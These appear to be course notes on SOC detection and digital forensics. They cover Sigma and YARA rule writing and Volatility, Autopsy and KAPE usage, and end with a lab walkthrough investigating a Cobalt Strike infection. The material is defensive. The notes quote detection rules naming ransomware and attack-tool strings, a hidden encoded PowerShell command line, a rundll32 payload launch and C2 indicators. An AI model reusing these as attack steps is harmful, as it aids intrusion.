    - <https://codewhitesec.blogspot.com/2018/07/lethalhta.html>
author: Markus Neis
date: 2018/06/07
tags:
    - attack.defense_evasion
    - attack.t1218.005
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        ParentImage|endswith: '\\svchost.exe'
        Image|endswith: '\\mshta.exe'
    condition: selection
falsepositives:
    - Unknown
level: high
```

**Key Components of a Sigma Rule**

1. **Title**: Describes the detection focus (e.g., "Potential LethalHTA Technique Execution").
2. **ID**: Unique identifier (UUID recommended).
3. **Status**: Status of the rule (e.g., stable, test, experimental).
4. **Description**: Brief explanation of what the rule detects.
5. **References**: Links to supporting articles or research.
6. **Author**: Rule creator’s name or handle.
7. **Date**: Creation date in YYYY/MM/DD format.
8. **Log Source**: Specifies the log source and platform (e.g., `category: process_creation`, `product: windows`).
9. **Detection Pattern**:
  - **Selection**: Specifies the patterns to match in logs.
  - **Condition**: Describes the relationship between patterns (e.g., `condition: selection`).

**Detection Modifiers**

Modifiers refine detection searches:

- **contains**: Wildcards on both ends of a value (e.g., `CommandLine|contains`).
- **startswith** / **endswith**: Wildcards on one end.
- **re**: Regex-based matching.

Example modifiers in use:

```
detection:
  selection:
    ParentImage|endswith: '\\svchost.exe'
    Image|endswith: '\\mshta.exe'
  condition: selection
```

**Sigma Rule Development Best Practices**

Sigma’s [Rule Creation Guide](https://github.com/SigmaHQ/sigma/wiki/Specification) provides best practices for rule development, including detailed information on structuring and writing effective detection rules.

**Common Operators in Conditions**

Sigma conditions link detection elements, supporting operators like:

- `and` / `or`: Logical conjunctions.
- `all of them`: Matches all patterns.
- `not`: Excludes certain matches.
- Brackets `()`: Enforces operation order.

Example condition:

`condition: selection1 or selection2 or selection3`

#### **YARA and YARA Rules**

**YARA and YARA Rules**

**YARA** is a powerful, pattern-matching tool that identifies files based on specific patterns and rules. These rules allow SOC analysts and forensic teams to detect, classify, and investigate suspicious files and malware samples. YARA rules analyze files' text or binary content and can also be applied to memory, aiding in both malware detection and proactive threat hunting.

---

**Uses of YARA**

1. **Malware Detection**: Identifies malware based on unique patterns or behaviors.
2. **File Classification**: Helps categorize files by format, version, metadata, etc.
3. **IOC Detection**: Searches files for indicators of compromise like registry keys or file names.
4. **Threat Hunting**: Proactively searches for threats across environments.
5. **Incident Response**: Quickly searches for artifacts in response to security incidents.
6. **Custom Rules for Targeted Threats**: Creates custom rules for specific organizational needs.

---

**How YARA Works**

1. **Rules Set**: Rules define patterns or behaviors to match against.
2. **Files Set**: Files or memory snapshots to scan.
3. **YARA Engine**: Compares file content byte-by-byte with the defined rules.
4. **Detection Output**: If patterns are matched, YARA flags the file as detected.

---

**YARA Rule Structure**

**1. Basic Structure:**

```
rule RuleName {
    meta:
        author = "Author Name"
        description = "Rule description"
    strings:
        $string1 = "sample_text"
        $string2 = { 4A 2D 1C}
condition:
        all of them
}
```

**2. Components of a YARA Rule:**

- **Rule Header**: Begins with the keyword `rule`, followed by the rule name.
- **Meta Section**: Metadata like author, description, version, and references.
- **Strings Section**: Defines text, hexadecimal patterns, or regex to search for.
- **Condition Section**: Sets conditions for triggering the rule.

**3. Example Rule – Detecting WannaCry Ransomware Strings:**

```
rule Ransomware_WannaCry {
    meta:
        author = "Analyst Name"
        description = "Detects WannaCry-specific strings"
    strings:
        $wannacry1 = "tasksche.exe" fullword ascii
        $wannacry2 = "iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com" ascii
        $wannacry3 = "mssecsvc.exe" fullword ascii
condition:
        all of them
}
```

**4. Conditions and Logic Operators:**

- `all of them`: All specified patterns must match.
- `any of them`: Any one of the specified patterns can match.
- **File Size Condition**: Ensures the file size meets criteria:
  ```
  condition:
      filesize < 100KB and uint16(0) == 0x5A4D
  ```
- `uint16(0) == 0x5A4D`: Checks if the first two bytes match `0x5A4D` (indicating an MZ header for executables).

---

**Advanced Features of YARA Rules**

- **Logical Operators**: Combine conditions with `and`, `or`, `not`.
- **External Modules**: Extend rule functionality for specialized needs.
- **Customizability**: Allows tailoring rules to fit specific threats or indicators.

**12. Introduction to Digital Forensics**

#### **Disk Forensics**

**Key Functionalities for Disk Forensics**

- **File Structure Insight**: Provides a navigable view of the file system, allowing quick access to directories and specific files. This feature is critical for locating suspicious files.
- **Hex Viewer**: Enables detailed inspection of files in hexadecimal format, useful when dealing with custom malware or specific exploits.
- **Web Artifacts Analysis**: Allows analysis of user web data, such as browsing history and cached files, which is essential for tracking activities leading up to an incident.
- **Email Carving**: Extracts and displays email data from disk images, often valuable when investigating internal threats or communication-based attacks.
- **Image Viewer**: Facilitates viewing images stored on the system, potentially useful for policy checks or identifying illegal content.
- **Metadata Analysis**: Provides insights into file attributes like creation dates, modification times, and hashes. These details help establish a timeline and correlate with other findings, such as malware activity.

**Autopsy: A Forensic Tool Overview**

**Autopsy** is an open-source digital forensics tool that leverages the Sleuth Kit framework. It provides a user-friendly interface with extensive features found in commercial tools, such as:

1. **Data Source Navigation**: Explore files and directories directly within the disk image.
2. **Web Artifact Examination**: Extracts web browsing artifacts like history, bookmarks, and cached files.
3. **Attached Device Analysis**: Identifies and examines external devices connected to the system.
4. **Deleted File Recovery**: Recovers deleted files by scanning the disk sectors for data remnants.
5. **Keyword Searches**: Performs in-depth searches across disk content for specific keywords.
6. **Keyword Lists**: Allows targeted searching using pre-defined lists of keywords (e.g., names, IPs, indicators of compromise).
7. **Timeline Analysis**: Maps out events chronologically, aiding in the construction of an accurate timeline for investigation.

**Practical Use of Autopsy in Forensic Analysis**

Once a disk image is loaded in Autopsy, the forensic artifacts are organized in the sidebar, enabling efficient access to:

- **Data Sources**: A view of all files and directories.
- **Web Artifacts**: A focused view of internet history and related data.
- **Device Information**: Details on any attached external devices.
- **Deleted Files**: Recovered files and fragments that were marked for deletion.
- **Keyword & List Searches**: In-depth searching capabilities.
- **Timeline Analysis**: An organized, chronological display of system events, crucial for understanding the sequence of actions leading up to an incident.

[https://academy.hackthebox.com/module/237/section/2611](https://academy.hackthebox.com/module/237/section/2611)

#### **Evidence Acquisition Techniques & Tools**

Evidence acquisition is crucial in digital forensics, involving the meticulous collection of data from various sources to ensure its authenticity and legal admissibility.

**1. Forensic Imaging**

Forensic imaging involves creating an exact, bit-by-bit copy of storage media, essential for preserving the original state of data. Tools for forensic imaging include:

- **FTK Imager**: Allows creation of perfect disk copies, viewing and analyzing data without alteration.
- **AFF4 Imager**: Open-source tool supporting multiple file systems with compressed imaging capabilities.
- **DD and DCFLDD**: Unix-based command-line utilities; DCFLDD includes forensic-specific enhancements like hashing.
- **Virtualization Tools**: Used to acquire images from virtual environments, often through snapshots.

**Example: Imaging with FTK Imager**

1. Select **File > Create Disk Image**.
2. Choose the source (Physical/Logical Drive) and specify the destination.
3. Set image type, fragmentation, and compression, then **Start**.
4. After imaging, FTK Imager verifies and summarizes the results.

**Example: Mounting Disk Image with Arsenal Image Mounter**

1. Run **Arsenal Image Mounter** as admin.
2. Mount the image as **read-only** to maintain integrity.
3. The image appears as a drive, e.g., `D:\\`.

**2. Extracting Host-based Evidence & Rapid Triage**

Host-based evidence includes artifacts from operating systems like Windows, generated by application execution, file modifications, and user activity. Evidence acquisition is categorized by data volatility:

- **Volatile Data**: Captured from active memory and includes live memory contents, often containing traces of malware.
  - **Memory Acquisition Tools**:
    - **WinPmem**: Open-source memory capture tool for Windows.
    - **DumpIt**: Simple tool for Windows/Linux memory dumps.
    - **MemDump**: CLI tool capturing system RAM.
    - **Magnet RAM Capture**: Free memory capture tool from Magnet Forensics.
- **Non-volatile Data**: Persists on disk and includes registry entries, Windows Event Logs, and system or application artifacts.

**Example: Memory Acquisition with WinPmem**

```
C:\\Users\\X\\Downloads> winpmem_mini_x64_rc2.exe memdump.raw
```

**Rapid Triage with KAPE**

KAPE (Kroll Artifact Parser and Extractor) accelerates evidence collection by gathering essential artifacts.

1. **Targets**: Define the data to collect, stored as `.tkape` files in the `KAPE\\Targets` directory.
2. **Execution**:
  - Set source (`D:\\`) and destination paths.
  - Use **gkape.exe** (GUI) to configure options and start the collection.
3. Results include $MFT and other system directories in the output directory.

**Remote Collection with EDR & Velociraptor**

- **EDR Solutions**: Facilitate remote evidence gathering, with capabilities for searching across networks.
- **Velociraptor**: Uses VQL queries and Hunts to gather artifacts like **Windows.KapeFiles.Targets**.

**3. Extracting Network Evidence**

Network evidence analysis is foundational for SOC analysts, involving tools and data sources that capture and interpret network traffic.

- **Traffic Capture**: Tools like **Wireshark** and **tcpdump** capture packets to analyze network communication.
- **IDS/IPS Systems**: IDS (Intrusion Detection Systems) detect, while IPS (Intrusion Prevention Systems) detect and block suspicious activity.
- **Traffic Flow Data**: Tools like **NetFlow** provide high-level traffic behavior insights.
- **Firewall Logs**: Offer information on attempted exploits and unauthorized access attempts.

#### **Key Concepts**

**Electronic Evidence**

- Digital forensics focuses on electronic evidence, including files, emails, logs, databases, and network traffic.
- Evidence can originate from various sources like computers, mobile devices, servers, cloud services, and other digital assets.

**Preservation of Evidence**

- Preserving the integrity and authenticity of digital evidence is paramount.
- Proper procedures, including chain of custody documentation, are crucial to prevent accidental alteration and ensure admissibility.

**Forensic Process**

The forensic process in digital investigations generally includes several key stages:

1. **Identification**: Determine potential sources of evidence.
2. **Collection**: Gather data using forensically sound methods.
3. **Examination**: Analyze the collected data to identify relevant information.
4. **Analysis**: Interpret findings to understand the incident.
5. **Presentation**: Present findings in a clear, comprehensive manner.

**Types of Cases**

Digital forensics applies to various types of investigations:

- **Cybercrime Investigations**: Cases involving hacking, fraud, or data theft.
- **Intellectual Property Theft**: Protection of proprietary information.
- **Employee Misconduct**: Internal investigations.
- **Data Breaches**: Response to security incidents affecting organizations.
- **Litigation Support**: Assisting in legal proceedings.

**Basic Steps in a Forensic Investigation**

1. **Create a Forensic Image**: Make a bit-for-bit copy of the system for analysis.
2. **Document the System's State**: Record details such as active processes, open connections, and logged-in users.
3. **Identify and Preserve Evidence**: Secure any data that may contain relevant information.
4. **Analyze the Evidence**: Look for data points that explain the incident.
5. **Timeline Analysis**: Build a timeline to understand the sequence of events.
6. **Identify Indicators of Compromise (IoCs)**: Locate signs of compromise within the data.
7. **Report and Documentation**: Create detailed reports summarizing findings and actions taken.

---

**Digital Forensics for SOC Analysts**

In a Security Operations Center (SOC), digital forensics plays a critical role in responding to and analyzing cyber threats:

**Post-Incident Analysis**

- Forensic analysis provides a detailed breakdown of incidents, helping analysts trace an attacker’s methods, motives, and potential identity.
- This information helps to improve organizational defenses by identifying vulnerabilities.

**Swift Response in Security Incidents**

- Digital forensics tools enable rapid analysis of large datasets, allowing for prompt identification of the moment of compromise, affected systems, and the attack method.
- Quick threat containment is essential to limit the scope and impact of the incident.

**Legal Considerations**

- Forensics provides legally admissible evidence, crucial for legal action following significant breaches.
- Collected evidence is logged, hashed, and timestamped to ensure its integrity, supporting its use in court if needed.

**Proactive Threat Hunting**

- Digital forensics enables SOC teams to proactively search for signs of compromise rather than simply responding to alerts.
- Past incidents provide IoCs and TTPs that analysts can use to hunt for potential threats.

**Enhanced Incident Response**

- Comprehensive forensic analysis allows for better-tailored responses, ensuring that all compromised systems are addressed.
- Understanding the full scope of an attack reduces the likelihood of attackers re-entering the system through the same vulnerability.

**Continuous Learning and Improvement**

- Each incident offers learning opportunities, helping SOC teams stay ahead of evolving attack techniques.
- By dissecting past incidents, analysts can anticipate and defend against new tactics.

#### **Memory Forensics**

**Types of Data in RAM Useful for Investigations**

- **Network connections**
- **File handles & Open Files**
- **Registry keys**
- **Running processes**
- **Loaded DLLs & Drivers**
- **Console command history**
- **User credentials**
- **Malware artifacts**
- **System configurations**

**Process for Memory Forensics**

1. **Process Identification and Verification**
  - Enumerate running processes, validate origins, and check against known legitimate processes.
2. **Process Component Analysis**
  - Examine associated DLLs and handles, looking for unauthorized injections.
3. **Network Activity Review**
  - Analyze active connections, IPs, and domains to trace external communications.
4. **Code Injection Detection**
  - Identify techniques like process hollowing by examining memory anomalies.
5. **Rootkit Detection**
  - Identify deep-seated malware that embeds in OS using elevated privileges.
6. **Suspicious Elements Extraction**
  - Isolate suspicious components for detailed forensic examination.

**The Volatility Framework**

**Overview**

Volatility is an open-source memory forensics tool used on various platforms to dissect memory images across operating systems, including Windows, macOS, and Linux.

**Common Volatility Modules**

- **pslist**: Lists running processes.
- **cmdline**: Shows command-line arguments.
- **netscan**: Identifies network connections.
- **malfind**: Detects malicious code in processes.
- **handles**: Lists open handles.
- **svcscan**: Scans Windows services.
- **dlllist**: Lists loaded DLLs.
- **hivelist**: Lists registry hives in memory.

**Volatility Usage Examples**

- **Forensics with Volatility Help**:
  ```
  vol.py --help
  ```
- **List Running Processes**:
  ```
  vol.py -f /path/to/memory.dump --profile=Win7SP1x64 pslist
  ```
- **Network Artifact Scanning**:
  ```
  vol.py -f /path/to/memory.dump --profile=Win7SP1x64 netscan
  ```
- **Detect Injected Code**:
  ```
  vol.py -f /path/to/memory.dump --profile=Win7SP1x64 malfind --pid=608
  ```
- **List Loaded DLLs for Specific Process**:
  ```
  vol.py -f /path/to/memory.dump --profile=Win7SP1x64 dlllist -p 1512
  ```
- **List Windows Services**:
  ```
  vol.py -f /path/to/memory.dump --profile=Win7SP1x64 svcscan
  ```

**Rootkit Detection Using psscan and pslist Plugins**

- **psscan** plugin reveals processes hidden by rootkits:
  ```
  vol.py -f /path/to/rootkit.dump psscan
  ```

**Memory Analysis Using Strings**

- **IPv4 Address Search**:
  ```
  strings /path/to/memory.dump | grep -E "\\b([0-9]{1,3}\\.){3}[0-9]{1,3}\\b"
  ```
- **Email Address Extraction**:
  ```
  strings /path/to/memory.dump | grep -oE "\\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Za-z]{2,4}\\b"
  ```
- **Command Line Artifacts**:
  ```
  strings /path/to/memory.dump | grep -E "(cmd|powershell|bash)[^\\s]+"
  ```

#### **Practical Digital Forensics Scenario**

**Scenario Setup**

- **Target System Access**: Use RDP to connect to the Target IP with provided credentials.
- **Evidence Locations**:
  - **Memory Dump**: `C:\\Users\\johndoe\\Desktop\\memdump\\PhysicalMemory.raw`
  - **Rapid Triage Artifacts**:
    - `C:\\Users\\johndoe\\Desktop\\kapefiles`
    - `C:\\Users\\johndoe\\Desktop\\files`
  - **Full Disk Image**: `C:\\Users\\johndoe\\Desktop\\fulldisk.raw.001`
  - **Parsed Disk Data**: `C:\\Users\\johndoe\\Desktop\\MalwareAttack`

**Notes**

- Autopsy analysis should be done from `C:\\Users\\johndoe\\Desktop\\MalwareAttack`.
- Ideal forensics environment is separate from the impacted system; analysis is done directly on the affected system here for expediency.

---

**Memory Analysis with Volatility v3**

**Identifying Memory Profile**

To get OS and kernel details of the memory dump:

```
python vol.py -q -f ..\\memdump\\PhysicalMemory.raw windows.info
```

**Sample Output**

| **Variable** | **Value** |
|---|---|
| Kernel Base | 0xf80150019000 |
| DTB | 0x1ad000 |
| Symbols | file:///C:/Users/johndoe/Desktop/... |
| Is64Bit | True |
| SystemTime | 2023-08-10 09:35:40 |
| NtSystemRoot | C:\\Windows |
| NtMajorVersion | 10 |
| NtMinorVersion | 0 |

**Detecting Injected Code**

To find process memory regions potentially containing injected code:

```
python vol.py -q -f ..\\memdump\\PhysicalMemory.raw windows.malfind
```

**Sample Output**

Processes with `PAGE_EXECUTE_READWRITE` memory:

- `PID 3648` (rundll32.exe), `PID 6744` (powershell.exe), `PID 5468` (rundll32.exe)

**Explanation of**`PAGE_EXECUTE_READWRITE`

- This permission allows both execution and modification of code in memory, typically avoided in legitimate applications.
- Common with malware, which injects code into memory and executes it, warranting further investigation.

---

**Identifying Running Processes**

**Listing Processes**

Using `windows.pslist` to list processes:

```
python vol.py -q -f ..\\memdump\\PhysicalMemory.raw windows.pslist
```

**Sample Output (Excerpt)**

| **PID** | **PPID** | **ImageFileName** | **CreateTime** | **SessionId** |
|---|---|---|---|---|
| 4 | 0 | System | 2023-08-10 00:22:53.000000 | N/A |
| 3648 | 7148 | rundll32.exe | 2023-08-10 09:15:14.000000 | 1 |
| 6744 | 908 | powershell.exe | 2023-08-10 09:21:16.000000 | 1 |
| 5468 | 7512 | rundll32.exe | 2023-08-10 09:23:15.000000 | 0 |

**Viewing Process Tree**

Using `windows.pstree` to view parent-child process relationships:

```
python vol.py -q -f ..\\memdump\\PhysicalMemory.raw windows.pstree
```

- Shows parent-child relationships, helping identify suspicious child processes spawned by common processes (e.g., rundll32.exe under explorer.exe).

---

**Identifying Process Command Lines**

Using `windows.cmdline` to retrieve command-line arguments:

```
python vol.py -q -f ..\\memdump\\PhysicalMemory.raw windows.cmdline
```

**Sample Output**

| **PID** | **Process** | **Args** |
|---|---|---|
| 416 | csrss.exe | `%SystemRoot%\\system32\\csrss.exe ObjectDirectory=\\Windows ...` |
| 3648 | rundll32.exe | `C:\\Windows\\System32\\rundll32.exe payload.dll,StartW` |
| 6744 | powershell.exe | `PowerShell.exe -nop -w hidden -encodedcommand JABzAD0ATgBlAHcAL...` |

---

**Dumping Process Memory & Leveraging YARA**

To analyze process 3648, use Volatility's `windows.memmap` plugin to extract all memory-resident pages of this process:

```
python vol.py -q -f ../memdump/PhysicalMemory.raw windows.memmap --pid 3648 --dump
```

Sample output:

```
0xf8016d0e9000  0x2077d000      0x3000  0x1bde4000      pid.3648.dmp
... (continues with memory pages)
```

The memory dump `pid.3648.dmp` is stored at `c:\\Users\\johndoe\\Desktop`.

**Scanning with YARA**

Scan the memory dump with YARA rules using a PowerShell loop to apply all available rules from `https://github.com/Neo23x0/signature-base`.

PowerShell script:

```
$rules = Get-ChildItem C:\\Users\\johndoe\\Desktop\\yara-4.3.2-2150-win64\\rules | Select-Object -Property Name
foreach ($rule in $rules) {C:\\Users\\johndoe\\Desktop\\yara-4.3.2-2150-win64\\yara64.exe C:\\Users\\johndoe\\Desktop\\yara-4.3.2-2150-win64\\rules\\$($rule.Name) C:\\Users\\johndoe\\Desktop\\pid.3648.dmp}
```

Sample output indicates hits for:

- `HKTL_CobaltStrike_Beacon_Strings`
- `CobaltStrike_Sleep_Decoder_Indicator`
- `WiltedTulip_ReflectiveLoader`

**Identifying Loaded DLLs**

Examine loaded DLLs using the `windows.dlllist` plugin:

```
python vol.py -q -f ../memdump/PhysicalMemory.raw windows.dlllist --pid 3648
```

Output includes:

- `payload.dll` at `E:\\payload.dll`, suggesting possible external or ISO origin.

**Identifying Handles**

Use `windows.handles` to reveal accessed files and registry entries:

```
python vol.py -q -f ../memdump/PhysicalMemory.raw windows.handles --pid 3648
```

Sample output:

- Access to `\\Device\\HarddiskVolume3\\Users\\johndoe\\Desktop`

**Identifying Network Artifacts**

Analyze network connections with `windows.netstat`:

```
python vol.py -q -f ../memdump/PhysicalMemory.raw windows.netstat
```

Sample output reveals connections for:

- `chrome.exe`, `WWAHost.exe`, and `rundll32.exe`

For comprehensive network analysis, use:

```
python vol.py -q -f ../memdump/PhysicalMemory.raw windows.netscan
```

Sample output reveals:

- The suspicious process (PID `3648`) has been communicating with `44.214.212.249` over port `80`.

---

**Disk Image/Rapid Triage Data Examination & Analysis**

**Searching for Keywords with Autopsy**

- Open Autopsy and access the case at: `C:\\Users\\johndoe\\Desktop\\MalwareAttack`
- Search for `payload.dll`, prioritize by creation time.
- Significant finding: `Finance08062023.iso` in Downloads, related to `E` drive DLL.
- Extraction: Right-click on `Finance08062023.iso` and select **Extract File(s)**.

**Identifying Web Download Information & Extracting Files**

- `.Zone.Identifier` via Alternate Data Stream (ADS) confirms internet origin.
- Source URL identified in Web Downloads artifacts as: `letsgohunt[.]site`.

**Analyzing Cobalt Strike Beacon Configuration**

- Use `CobaltStrikeParser` at: `C:\\Users\\johndoe\\Desktop\\CobaltStrikeParser-master\\CobaltStrikeParser-master`
- Command: `python parse_beacon_config.py E:\\payload.dll`
- Key Configurations Extracted:
  - **BeaconType**: HTTP, **Port**: 80, **C2Server**: letsgohunt.site,/load
  - Other notable fields: `HttpGet_Metadata`, `bUsesCookies`, `Spawnto_x64`.

**Persistence Mechanisms with Autoruns**

- Autoruns analysis: Check `C:\\Users\\johndoe\\Desktop\\files\\johndoe_autoruns.arn`
- Found entry:
  - Path: `HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run`
  - Image: `C:\\ProgramData\\svchost.exe`

**File Hash Identification & VirusTotal**

- To identify hash of `photo433.exe`:
  ```
  PS C:\\Users\\johndoe> Get-FileHash -Algorithm SHA256 "C:\\Users\\johndoe\\Desktop\\kapefiles\\auto\\C%3A\\Users\\johndoe\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\photo443.exe"
  ```

**Scheduled Tasks & Timestomping Analysis**

- Inconsistency between `$FILE_NAME MFT Modified` and `$STANDARD_INFORMATION File Modified` timestamps indicates timestomping.

**SRUM Data Analysis**

- Observed potential exfiltration of `430526981` bytes from `SRUDB.dat`.

**Windows Event Logs Analysis with Chainsaw**

- Command:
  ```
  C:\\Users\\johndoe>chainsaw_x86_64-pc-windows-msvc.exe hunt "..\\kapefiles\\auto\\C%3A\\Windows\\System32\\winevt\\Logs" -s sigma/ --mapping mappings/sigma-event-logs-all.yml -r rules/ --csv --output output_csv
  ```
- Alerts observed in `sigma.csv`:
  - **Cobalt Strike Load by rundll32**
  - **UAC Bypass/Privilege Escalation by fodhelper.exe**

**Prefetch Files Analysis**

- Command to analyze prefetch files:
  ```
  C:\\Users\\johndoe>C:\\Users\\johndoe\\Desktop\\Get-ZimmermanTools\\net6\\PECmd.exe -d "C:\\Users\\johndoe\\Desktop\\kapefiles\\auto\\C%3A\\Windows\\Prefetch" -q --csv C:\\Users\\johndoe\\Desktop --csvf suspect_prefetch.csv
  ```

**USN Journal Analysis**

- Command:
  ```
  C:\\Users\\johndoe>python C:\\Users\\johndoe\\Desktop\\files\\USN-Journal-Parser-master\\usnparser\\usn.py -f C:\\Users\\johndoe\\Desktop\\kapefiles\\ntfs\\%5C%5C.%5CC%3A\\$Extend\\$UsnJrnl:$J -o C:\\Users\\johndoe\\Desktop\\usn_output.csv -c
  ```

Suspicious activities took place approximately between `2023-08-10 09:00:00` and `2023-08-10 10:00:00`.

To view the CSV using PowerShell in alignment with our timeline, we can execute:

```
PS C:\\Users\\johndoe> $time1 = [DateTime]::ParseExact("2023-08-10 09:00:00.000000", "yyyy-MM-dd HH:mm:ss.ffffff", $null)
PS C:\\Users\\johndoe> $time2 = [DateTime]::ParseExact("2023-08-10 10:00:00.000000", "yyyy-MM-dd HH:mm:ss.ffffff", $null)
PS C:\\Users\\johndoe> Import-Csv -Path C:\\Users\\johndoe\\Desktop\\usn_output.csv | Where-Object { $_.'FileName' -match '\\.exe$|\\.txt$|\\.msi$|\\.bat$|\\.ps1$|\\.iso$|\\.lnk$' } | Where-Object { $_.timestamp -as [DateTime] -ge $time1 -and $_.timestamp -as [DateTime] -lt $time2 }
```

---

Here's the full markdown for the content provided, formatted for clarity and utility in digital forensic analysis:

---

**Disk Image/Rapid Triage Data Examination & Analysis**

**Analyzing Rapid Triage Data - MFT/pagefile.sys (MFTECmd/Autopsy)**

**Recovering Deleted Files Using MFT Analysis**

1. **Objective**: Attempt to recover `flag.txt` via MFT analysis.
  - **Challenge**: The affected machine's MFT table is unavailable.
  - **Alternative**: Use another system’s MFT table (`C:\\Users\\johndoe\\Desktop\\files\\mft_data`), where `flag.txt` was similarly deleted.
2. **Run MFTECmd** to parse the $MFT file:
  ```
  C:\\Users\\johndoe> C:\\Users\\johndoe\\Desktop\\Get-ZimmermanTools\\net6\\MFTECmd.exe -f C:\\Users\\johndoe\\Desktop\\files\\mft_data --csv C:\\Users\\johndoe\\Desktop\\ --csvf mft_csv.csv
  ```
  - **Output**:
    - Processed MFT file with **113,899** records (4,009 marked as free).
    - **CSV output** saved at `C:\\Users\\johndoe\\Desktop\\mft_csv.csv`.
3. **Search for flag.txt**:
  ```
  PS C:\\Users\\johndoe> Select-String -Path C:\\Users\\johndoe\\Desktop\\mft_csv.csv -Pattern "flag.txt"
  ```
  - **Result**:
    - Provides `flag.txt`'s location: `\\Users\\johndoe\\Desktop\\reports`.
4. **Verify with MFT Explorer**:
  - **Tool**: Open `C:\\Users\\johndoe\\Desktop\\files\\mft_data` in MFT Explorer (available at `C:\\Users\\johndoe\\Desktop\\Get-ZimmermanTools\\net6\\MFTExplorer`).
  - **Finding**: Within the `reports` folder, `flag.txt` is marked with the **Is deleted** attribute.

**Understanding NTFS File Deletion**

- **Insight**:
  - Deleted files on NTFS volumes have MFT entries marked as free, making recovery possible until the data is overwritten.
  - **Case-Specific**: The compromised system’s file was overwritten, necessitating MFT analysis on another system.

**Extracting Data from pagefile.sys**

1. **Scenario**: Portions of `flag.txt` remain in `pagefile.sys`, which Windows uses to manage RAM overflow.
2. **Approach**:
  - Use **Autopsy** to scan `pagefile.sys` for partial content recovery.

**Constructing an Execution Timeline with Autopsy**

1. **Timeline Parameters**:
  - **Incident Window**: 09:13 to 09:30 (GMT / UTC).
  - **Tool**: Autopsy, leveraging Plaso for timeline generation.
2. **Configuration**:
  - **Event Types**: Select `Web Activity: All` and `Other: All`.
  - **Time Settings**:
    - Start: `Aug 10, 2023, 9:13:00 AM`
    - End: `Aug 10, 2023, 9:30:00 AM`
3. **Purpose**:
  - To map the chronological actions of the malicious actor by filtering files accessed or created during this interval.

**The Actual Attack Timeline**

- **Objective**: Examine identified and undetected actions taken by the attacker.
- **Next Step**: Based on forensic findings, try to match documented activity with any undetected actions outlined in the actual attack sequence.

#### **Rapid Triage Examination & Analysis Tools**

**Download and Setup**

- Use the `.net 4` or `.net 6` link on the website for downloads.
- Alternatively, utilize PowerShell:
  ```
  PS C:\\Users\\johndoe\\Desktop\\Get-ZimmermanTools> .\\Get-ZimmermanTools.ps1
  ```
  - Downloads all tools to `C:\\htb\\dfir_module\\tools`.
  - Tracks SHA-1 for easy updates.

**MAC(b) Times in NTFS**

**MAC(b)** times track file system events:

- **Modified Time (M)**: Last content modification.
- **Accessed Time (A)**: Last access time.
- **Changed (C)**: Reflects MFT changes.
- **Birth Time (b)**: Original creation time.

**Example Commands**

- **MFTECmd to Inspect $MFT Files**:
  ```
  PS C:\\Users\\johndoe\\Desktop\\Get-ZimmermanTools\\net6> .\\MFTECmd.exe -f 'C:\\Users\\johndoe\\Desktop\\forensic_data\\kape_output\\D\\$MFT' --de 0x16169
  ```

**Investigation Tools Overview**

**MFT File Structure**

- Master File Table (MFT) is crucial in tracking files on NTFS.
- **Attributes in MFT** include `$STANDARD_INFORMATION` and `$FILE_NAME`.

**Windows Event Logs**

- **EvtxECmd** for parsing EVTX logs to CSV or JSON:
  ```
  PS C:\\Users\\johndoe\\Desktop\\Get-ZimmermanTools\\net6\\EvtxeCmd> .\\EvtxECmd.exe -f "path\\to\\log.evtx" --csv "output_path"
  ```
- **Event Query Language (EQL)** for querying JSON-formatted logs.

**Windows Registry Analysis**

- **RegRipper** extracts specific data via plugins:
  ```
  PS C:\\Users\\johndoe\\Desktop\\RegRipper3.0-master> .\\rip.exe -r "C:\\path\\to\\hive" -p plugin_name
  ```
- **Registry Explorer** provides GUI access.

**Program Execution Artifacts**

1. **Prefetch Analysis** with **PECmd**:
  ```
  PS C:\\Users\\johndoe\\Desktop\\Get-ZimmermanTools\\net6> .\\PECmd.exe -f C:\\path\\to\\prefetch_file.pf
  ```
2. **ShimCache and Amcache**: Access with Registry Explorer for program history.

**Advanced Analysis**

- **PowerShell Transcripts**: Review unusual PowerShell commands.
- **API Monitoring**: `getenv`, `CreateProcessA`, and `RegOpenKeyExA` show interaction details.

**Key Commands for Forensic Analysis**

**PowerShell Commands**

- Check network-related commands, encoded commands, and unusual modules.

**Other Important Scripts and Commands**

- **EQL JSON format creation**:
  ```
  PS C:\\Users\\eqllib-master\\utils> Get-WinEvent -Path "log_path" -Oldest | Get-EventProps | ConvertTo-Json
  ```

#### **Windows Forensics Overview**

**NTFS (New Technology File System)**

NTFS is Microsoft’s file system, known for features that enhance performance, security, and data integrity. Key forensic artifacts include:

- **File Metadata**: Stores timestamps and file attributes, aiding in timeline analysis.
- **MFT Entries**: The Master File Table tracks metadata for all files, providing details even on deleted files.
- **File Slack and Unallocated Space**: Contains remnants of deleted files.
- **File Signatures**: Used to identify files even if extensions are altered.
- **USN Journal**: Logs file changes, supporting investigations into modifications.
- **LNK Files**: Shortcuts that reveal file and program access history.
- **Prefetch Files**: Indicate which programs were recently executed.
- **Registry Hives**: Record system configurations and can reveal traces of unauthorized modifications.
- **Shellbags**: Track folder navigation, highlighting accessed directories.
- **Thumbnail Cache**: Stores previews of recently viewed images and documents.
- **Recycle Bin**: Retains deleted files, providing insight into user actions.
- **Alternate Data Streams (ADS)**: Hidden data associated with files, sometimes exploited by malware.
- **Volume Shadow Copies**: Snapshots of the file system for data recovery.
- **Security Descriptors and ACLs**: Store file permissions, useful for analyzing access rights and security breaches.

**Windows Event Logs**

Windows Event Logs record system and application events, capturing a range of user and system activities. Located at `C:\\Windows\\System32\\winevt\\logs`, these logs help detect:

- **System Errors**: Issues with the OS or applications.
- **Security Events**: Authentication attempts, policy changes, and access controls.
- **Application Events**: Logs from specific software, often useful in identifying exploitation attempts.

**Execution Artifacts**

Execution artifacts document traces of program and script executions, providing insight into user actions and malware activities. Notable artifacts include:

- **Prefetch Files**: Track execution metadata (file paths, execution counts).
- **Shimcache**: Records program execution for compatibility; useful for identifying recent activity.
- **Amcache**: Stores executable details (file paths, digital signatures, last execution).
- **UserAssist**: Tracks user-executed applications, showing names, counts, and timestamps.
- **RunMRU Lists**: Logs recently executed commands and programs.
- **Jump Lists**: Document recent files and tasks associated with applications.
- **Shortcut (LNK) Files**: Provide executable paths, timestamps, and user interactions.
- **Recent Items**: Tracks recently accessed files.
- **Windows Event Logs**: Logs events tied to process creation and termination.

